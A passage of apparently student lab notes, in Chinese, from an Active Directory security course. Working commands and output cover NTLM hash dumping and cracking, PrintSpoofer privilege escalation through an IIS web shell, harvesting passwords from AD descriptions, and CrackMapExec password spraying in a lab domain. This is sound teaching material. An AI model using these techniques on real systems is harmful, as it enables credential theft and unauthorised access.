user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: :1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 可以看到很多都是disabled，就代表我們要用下面的解法 Win10 v1607之後 因為這個版本之後有用到AES加密，所以可以用Creddump7，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事， $ conda activate py2.7 $ pip install pycrypto $ git clone https://github.com/CiscoCXSecurity/creddump7.git $ python pwdump.py system sam Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819::: user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 解析Hash 方法一：用online database 接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如cmd5，如果把最前面找到的31d6cfe0d16ae931b73c59d7e0c089c0會顯示空密碼，但我們都知道是錯的 而如果拿Creddump解析出來的7ecffff0c3548187607a14bad0f88bb1，就可以直接顯示出我們的密碼 方法二：爆字典檔 在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看 $ sudo gunzip /usr/share/wordlists/rockyou.txt.gz $ cp /usr/share/wordlists/rockyou.txt ./ $ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force ... 31d6cfe0d16ae931b73c59d7e0c089c0: 7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc ... Reference # PowerShell 「系統上已停用指令碼執行」解決方法\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":208,"href":"/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/","title":"NTUSTISC - AD Note - Lab(Hijack Token)","section":"Securities","content":" NTUSTISC - AD Note - Lab(Hijack Token) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 提權方法 利用弱點 Hijack Token Tools: PrintSpoofer Support: Windows 8.1/Server 2012 R2/10/Server 2019 How to use: $ PrintSpoofer.exe -c \u0026quot;command\u0026quot; Guess Password 管理服務 錯誤配置 Lab Time - 本地提權 # ==Hijack Token(Network Service)== # 這邊講師示範的是，如何利用IIS的特殊權限，達成提權。 先解釋一下，如果要使用PrintSpoofer之類的工具有個特殊的條件，就是需要有特殊權限，也就是 :::info\n$ whoami /priv 需要有下列其一權限: SeImpersonatePrivilege =\u0026gt; CreateProcessWithToken() SeAddignPrimaryToekn =\u0026gt; CreateProcessAsUser() :::\nwhoami /priv 我們先看一下正常使用者的特殊權限有哪些\n$ whoami /priv PRIVILEGES INFORMATION ---------------------- 特殊權限名稱 描述 狀況 ============================= ================== ====== SeShutdownPrivilege 關閉系統 已停用 SeChangeNotifyPrivilege 略過周遊檢查 已啟用 SeUndockPrivilege 從擴充座移除電腦 已停用 SeIncreaseWorkingSetPrivilege 增加處理程序工作組 已停用 SeTimeZonePrivilege 變更時區 已停用 可以看到上述的權限都沒有在這裏面，也就是說正常的使用者是不會有這兩個權限的，那誰會有這兩個權限呢?需要==impersonation(也就是講師說的切換身分)的人==，詳細的腳本可以看這邊1但今天不會用到，總之IIS就是一個需要做身分切換的角色，所以講師已經在Win10的電腦中設定好IIS，也起用了web shell的功能，我們就可以試看看，在browser中http://127.0.0.1/cmd.aspx，他可以直接用IIS的權限執行程式 從結果來看，他的確具有==SeImpersonatePrivilege==的權限而且已經啟用，那我們就可以直接用PrintSpoofer.exe執行其他指令\nUse PrintSpoofer.exe 從結果來看，我們的確已經提權了，再來可以用講師的指令測試一下權限 c:\\tools\\PrintSpoofer64.exe -c \u0026quot;c:\\windows\\system32\\cmd.exe /c whoami \u0026gt; c:\\inetpub\\wwwroot\\tmp.txt\u0026quot; 這一串指令是利用PrintSpoofer執行cmd.exe再執行whoami的command並寫道tmp.txt中 目前權限已經從iis apppool\\defaultapppool轉換成nt authority\\system也就是前面說的==本地端真正的最高權限使用者==\nReference # [2020鐵人賽] Day29 - 切換身分Impersonation \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":209,"href":"/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/","title":"NTUSTISC - AD Note - Lab(Leak Password)","section":"Securities","content":" NTUSTISC - AD Note - Lab(Leak Password) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nLab Time - 環境調查 # ==Lab - Leak Password from Description== # 在Win2016的server manager當中，可以從Dashboard/Tools/Active Directory Users and Computers中看到整個網域使用者的部分資料，例如Name, Type和Description，而這個東西其實是所有整個網域使用者都看地到，所以==不可以把機敏資料寫在這裡例如帳密之類的==，就像下面截圖一樣，Fara Iseabal和Lina Allene的密碼都被leak出去了 當然，有加入網域的帳號也看的到，從Win10的網域帳號bear中，打開PowerShell :::spoiler Result\n$ Get-ADUser -Filter * -Proper Description | Select-object Name,Description Name Description ---- ----------- Administrator Built-in account for administering the computer/domain Guest Built-in account for guest access to the computer/domain DefaultAccount A user account managed by the system. krbtgt Key Distribution Center Service Account Coraline Mahalia Gillian Marsiella Casi Hyacinth Mercy Edi Cyndie Rhodie Lucilia Lelah Fred Carmita Ortensia Fancy Seana Jeanette Logan Janeen Cassondra Lothario Ollie Dorita Gertrude Felecia Ella Randee New User ,DefaultPassword Anya Gypsy Ronni Kristoforo Maurizia Ines Reyna Gwendolyn Garnet Constancia Darlleen Dorisa Jessa Corinna Lorne Celie Bill Marylee Berna Raphaela Gabriel Diannne Shared User Caitrin Latia Selestina Cassi Carlye Chloette Dorrie Paolina Herminia Debby Rosetta Lotta Berny Kirby Moyra Fanechka Ranee Delinda Orelee Peri Shantee Marylin Annice Eden Stormie Natala Glenda Dorrie Laurena Mirelle Casandra Cherrita Lazaro Karoly Lina Allene User Password r2NE4/9:F;[k Kiri Kath Star Rikki Aloise Elfrida Shared User Marylynne Susannah Sherri Jacquetta Carey Kincaid Philippa Eugenie Dominica Carmon Eba Luca Martita Juanita Ruthie Ebony Charis Kory Bambi Etta Aleda Appolonia Shared User Randene Lelah Issy Eudora Margo Sharl Philis Gilli Reina Claire Corine Celesta Lon Sonni Joyann Sibella Katee Annemarie Henrieta Sabine Daile Odetta Marney Ranee Marlyn Loralee Fara Iseabal User Password 8F%kJ2q_cVFg Sofie Darlleen Jori Floria Replication Account Alikee Perri Karoly Nadeen Renae Babette Nolana Rivy Carmelle Libbi Sile Rhiamon Ruthann Britta Pietra Fern Amabelle Gayle Audi Rosalind Dollie Fayina Ricca Stefa Kaja Brenda Katharina Alyssa Angelique Hilda Linda Neda Shared User Jerrie Morganne Giulietta Moyra Erena Elinore Lily Kristofor Kizzee Margaux Christi Nettle Lilas Lindy Celeste Kelci Berget Celka Babb Joanne Andree Suki Bear Brown ::: 帳密一、Lina Allene$\\to$r2NE4/9:F;[k 帳密二、Fara Iseabal$\\to$8F%kJ2q_cVFg\n"},{"id":210,"href":"/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/","title":"NTUSTISC - AD Note - Lab(Password Spraying)","section":"Securities","content":" NTUSTISC - AD Note - Lab(Password Spraying) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) 和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來 Tool: CrackMapExec - 結合各種功能的內網滲透神器 GPO 記憶體(lsass) Lab # ==Password Spraying== # How to use?\nCheat Sheet $ crackmapexec \u0026lt;protocol\u0026gt; \u0026lt;target(s)\u0026gt; -u \u0026lt;a file or string only\u0026gt; -p \u0026lt;a file or string only\u0026gt; # For example $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd $ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth $ crackmapexec smb \u0026lt;filename\u0026gt; -u administrator -p Passw0rd --local-auth --local-auth代表是用本機帳號的角度登入，就不是用domain admin的角度登入 Recon Password Policy 在PowerShell中使用$ Get-ADDefaultDomainPasswordPolicy調查Domain上的密碼原則，Note: ==Win2016要打開==\n$ Get-ADDefaultDomainPasswordPolicy ComplexityEnabled : False DistinguishedName : DC=kuma,DC=org LockoutDuration : 00:01:00 LockoutObservationWindow : 00:01:00 LockoutThreshold : 0 MaxPasswordAge : 00:00:00 MinPasswordAge : 00:00:00 MinPasswordLength : 4 objectClass : {domainDNS} objectGuid : 29531761-1cf9-452c-8ee7-d5056e01d82b PasswordHistoryCount : 24 ReversibleEncryptionEnabled : False 要注意的地方：\nLockoutThreshold: 可以錯誤嘗試的次數，0就代表沒有設定，可以無限次數的爆破，如果有設定例如5，那可能就要修改攻擊策略，可能每天不能試超過兩次之類的，讓原使用者也還有容錯的空間可以登入 MinPasswordLength: 大多數使用者會遵從最小密碼原則，如果要猜密碼就可以嘗試從四位密碼以上開始猜 Check IP 首先我們要先看一下AD的IP為多少，通常我們要做這種password spraying都是對著AD，所以我們要先尋找目標\n$ ipconfig Windows IP Configuration Ethernet adapter Ethernet0: Connection-specific DNS Suffix . : localdomain Link-local IPv6 Address . . . . . : fe80::651f:6e78:505f:75f%5 IPv4 Address. . . . . . . . . . . : 192.168.222.128 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.222.2 Tunnel adapter isatap.localdomain: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : localdomain IP: 192.168.222.128\n在Kali使用CrackMapExec\n$ crackmapexec smb 192.168.222.128/24 -u administrator -p 1qaz@WSX3edc SMB 192.168.222.129 445 DESKTOP-G95U93T [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False) SMB 192.168.222.128 445 WIN-818G5VCOLJO [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True) SMB 192.168.222.129 445 DESKTOP-G95U93T [+] kuma.org\\administrator:1qaz@WSX3edc (Pwn3d!) SMB 192.168.222.128 445 WIN-818G5VCOLJO [+] kuma.org\\administrator:1qaz@WSX3edc (Pwn3d!) 可以看到這個網段底下的確有兩個主機的密碼被Pwn出來\nLab ==找出使用預設密碼(Changeme123!)的使用者 找出使用(ncc1701)作為密碼的使用者==\n我先試著用前面提到的leak password from description中找到的兩組密碼實際測試看看 帳密一、Lina Allene→r2NE4/9:F;[k 帳密二、Fara Iseabal→8F%kJ2q_cVFg :::spoiler Result of Lina\n$ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p r2NE4/9:F\\;\\[k SMB 192.168.222.129 445 DESKTOP-G95U93T [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False) SMB 192.168.222.128 445 WIN-818G5VCOLJO [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True) SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\Administrator:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\aleda.appolonia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\alikee.perri:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\aloise.elfrida:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\amabelle.gayle:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\andree.suki:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\angelique.hilda:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\annice.eden:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\anya.gypsy:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\audi.rosalind:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\babb.joanne:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\bambi.etta:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\bear:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\berget.celka:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\berna.raphaela:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\berny.kirby:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\bill.marylee:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\caitrin.latia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\carey.kincaid:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\carlye.chloette:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\carmelle.libbi:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\casandra.cherrita:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\casi.hyacinth:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\cassondra.lothario:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\celeste.kelci:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\charis.kory:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\christi.nettle:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\coraline.mahalia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\corine.celesta:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\cyndie.rhodie:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\daile.odetta:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\darlleen.dorisa:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\DefaultAccount:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\dollie.fayina:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\dominica.carmon:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\dorrie.paolina:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\eba.luca:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ella.randee:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\erena.elinore:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\fara.iseabal:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\fred.carmita:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\gabriel.diannne:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\garnet.constancia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\gertrude.felecia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\gillian.marsiella:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\giulietta.moyra:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\glenda.dorrie:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\Guest:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\henrieta.sabine:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\herminia.debby:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\issy.eudora:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\jerrie.morganne:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\jessa.corinna:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\jori.floria:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\joyann.sibella:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\kaja.brenda:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\karoly.nadeen:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\katee.annemarie:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\katharina.alyssa:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\kiri.kath:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\kizzee.margaux:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\krbtgt:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\laurena.mirelle:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lazaro.karoly:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lilas.lindy:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lily.kristofor:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [+] kuma.org\\lina.allene:r2NE4/9:F;[k SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\Administrator:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\aleda.appolonia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\alikee.perri:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\aloise.elfrida:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\amabelle.gayle:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\andree.suki:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\angelique.hilda:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\annice.eden:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\anya.gypsy:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\audi.rosalind:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\babb.joanne:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\bambi.etta:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\bear:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\berget.celka:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\berna.raphaela:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\berny.kirby:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\bill.marylee:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\caitrin.latia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\carey.kincaid:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\carlye.chloette:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\carmelle.libbi:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\casandra.cherrita:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\casi.hyacinth:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\cassondra.lothario:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\celeste.kelci:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\charis.kory:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\christi.nettle:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\coraline.mahalia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\corine.celesta:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\cyndie.rhodie:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\daile.odetta:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\darlleen.dorisa:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\DefaultAccount:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\dollie.fayina:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\dominica.carmon:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\dorrie.paolina:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\eba.luca:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ella.randee:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\erena.elinore:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\fara.iseabal:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\fred.carmita:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\gabriel.diannne:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\garnet.constancia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\gertrude.felecia:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\gillian.marsiella:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\giulietta.moyra:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\glenda.dorrie:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\Guest:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\henrieta.sabine:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\herminia.debby:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\issy.eudora:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\jerrie.morganne:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\jessa.corinna:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\jori.floria:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\joyann.sibella:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\kaja.brenda:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\karoly.nadeen:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\katee.annemarie:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\katharina.alyssa:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\kiri.kath:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\kizzee.margaux:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 